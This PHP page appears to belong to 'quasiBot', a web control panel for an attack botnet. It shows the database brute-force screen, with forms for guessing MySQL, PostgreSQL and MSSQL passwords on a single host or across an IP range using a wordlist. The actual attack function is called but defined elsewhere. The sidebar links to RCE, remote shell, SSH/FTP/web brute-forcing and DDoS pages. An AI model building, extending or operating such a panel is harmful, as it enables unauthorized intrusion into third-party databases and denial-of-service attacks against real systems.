<?php

require('../config.php');
auth();

?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">


<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
    <title>quasiBot | dbs</title>
    <link href="../style.css" rel="stylesheet" type="text/css" media="screen" />
</head>
<body>
<div id="wrapper">
    <div id="header">


        <div id="logo">
            <h1><a href="index.php">&nbsp; &nbsp; &nbsp;<?php echo date('H:i:s') ?></a></h1>

<?php
quotes();
?>

        </div>
    </div>
    <div id="menu">
        <ul>
            <li class="txt_left"><?php echo $_SERVER['DOCUMENT_ROOT'] ?></li>
            <li class="txt_left"><?php echo $_SERVER['PHP_SELF'] ?></li>
            <li class="txt_center"><?php echo date("d.m.y"); ?></li>
            <li class="txt_right"><?php echo $_SERVER['SERVER_ADDR'] ?></li>
            <li class="txt_right"><?php echo $_SERVER['SERVER_NAME'] ?></li>
            <li class="txt_right"><?php echo conn('http://bot.whatismyipaddress.com/') ?></li>
        </ul>
    </div>
    <div id="page">
        <div id="page-bgtop">
            <div id="page-bgbtm">
                <div id="content">

                    <div class="post">
                        <h2 class="title"><a href="#">Single bruteforce</a></h2>
                        <div class="entry">
                            <p class="meta"> 
                    Single Database attack &nbsp;&bull;&nbsp; If you won't use wordlist, default passwords array will be set - same for users</p>

                            <form method="post">
                            <center><br /><input type="checkbox" name="smysql"> MySQL &nbsp;&bull;&nbsp; <input type="checkbox" name="spgsql"> PgSQL &nbsp;&bull;&nbsp; <input type="checkbox" name="smssql"> MsSQL</center>
                            <br /><table>
                            <tr>
                            <td><b>Host</b></td>
                            <td><b>User</b></td>
                            <td><b>Wordlist</b></td>
                            <td><b>Use wordlist</b></td>
                            </tr>
                            <tr>
                            <td>
                            <b>
                            <?php
                             echo "<input type=\"text\" style=\"width: 200px;\" value=\"". (empty($_POST['shost'])?"127.0.0.1":htmlspecialchars($_POST['shost'])) ."\" name=\"shost\"></b>";
                            ?>
                            </td>
                            <td>
                            <b>
                            <?php
                             echo "<input type=\"text\" style=\"width: 70px;\" value=\"". (empty($_POST['suser'])?"":htmlspecialchars($_POST['suser'])) ."\" name=\"suser\"></b>";
                            ?>
                            </td>
                            <td>
                            <?php
                             echo "<input type=\"text\" style=\"width: 230px;\" value=\"". (empty($_POST['spath'])?"/home/wordlist/rock.txt":htmlspecialchars($_POST['spath'])) ."\" name=\"spath\"></b>";
                            ?>
                            </td>
                            <td style="text-align: left;">
                            <center><input type="radio" name="wordlist" value="1"></center>
                            </td>
                            <td><input type="submit" value="Go"></td>
                            </tr>
                            </table>
                            </form>


                        </div>
                    </div> 

                    <div class="post">
                        <h2 class="title"><a href="#">Massive bruteforce</a></h2>
                        <div class="entry">
                            <p class="meta"> 
                    Massive Database's attack &nbsp;&bull;&nbsp; Specify ip range as shown below</p>

                            <form method="post">
                            <center><br /><input type="checkbox" name="mmysql"> MySQL &nbsp;&bull;&nbsp; <input type="checkbox" name="mpgsql"> PgSQL &nbsp;&bull;&nbsp; <input type="checkbox" name="mmssql"> MsSQL</center>
                            <br /><table>
                            <tr>
                            <td><b>Host range</b></td>
                            <td><b>User</b></td>
                            <td><b>Wordlist</b></td>
                            <td><b>Use wordlist</b></td>
                            </tr>
                            <tr>
                            <td>
                            <b>
                            <?php
                             echo "<input type=\"text\" style=\"width: 200px;\" value=\"". (empty($_POST['mhost'])?"127.0.0.1-127.0.0.50":htmlspecialchars($_POST['mhost'])) ."\" name=\"mhost\"></b>";
                            ?>
                            </td>
                            <td>
                            <b>
                            <?php
                             echo "<input type=\"text\" style=\"width: 70px;\" value=\"". (empty($_POST['muser'])?"":htmlspecialchars($_POST['muser'])) ."\" name=\"muser\"></b>";
                            ?>
                            </td>
                            <td>
                            <?php
                             echo "<input type=\"text\" style=\"width: 230px;\" value=\"". (empty($_POST['mpath'])?"/home/wordlist/rock.txt":htmlspecialchars($_POST['mpath'])) ."\" name=\"mpath\"></b>";
                            ?>
                            </td>
                            <td style="text-align: left;">
                            <center><input type="radio" name="wordlist" value="2"></center>
                            </td>
                            <td><input type="submit" value="Go"></td>
                            </tr>
                            </table>
                            </form>

                        </div>
                    </div> 

                            <?php

                                brute_dbs();

                            ?>

                    <div style="clear: both;">&nbsp;</div>
                </div>
                <div id="sidebar">
                    <ul>
                        <li>
                            <h2>Home</h2>
                            <ul>
                                <li><a href="../home/index.php">Index</a></li>
                                <li><a href="../home/settings.php">Settings</a></li>
                                <li><a href="../home/rss.php">RSS</a></li>
                            </ul>
                        </li>
                        <li>
                           <h2>Hack</h2>
                            <ul>
                                <li><a href="../hack/rce.php">RCE</a></li>
                                <li><a href="../hack/scan.php">Scan</a></li>
                                <li><a href="../hack/pwn.php">Pwn</a></li>
                                <li><a href="../hack/shell.php">Shell</a></li>
                            </ul>
                        </li>
                        <li>
                        <li>
                           <h2>Bruteforce</h2>
                            <ul>
                                <li><a href="ssh.php">SSH</a></li>
                                <li><a href="ftp.php">FTP</a></li>
                                <li><a href="dbs.php"><b>DB's</b></a></li>
                                <li><a href="www.php">WWW</a></li>
                            </ul>
                        </li>
                        <li>
                           <h2>Tools</h2>
                            <ul>
                                <li><a href="../tools/sql.php">MySQL Manager</a></li>
                                <li><a href="../tools/hostscan.php">HostScan</a></li>
                             </ul>
                        </li>
                        <li>
                           <h2>Bots</h2>
                            <ul>
                                <li><a href="../hack/ddos.php">DDoS</a></li>
                                <li><a href="../hack/more.php">Run</a></li>
                             </ul>
                        </li>
                </div>
                <div style="clear: both;">&nbsp;</div>
            </div>
        </div>
    </div>
</div>
<div id="footer">
    <p><?php echo $_SERVER['SERVER_SOFTWARE']; echo '  -  '; echo $_SERVER['HTTP_USER_AGENT'] ?></p>
</div>
</body>
</html>
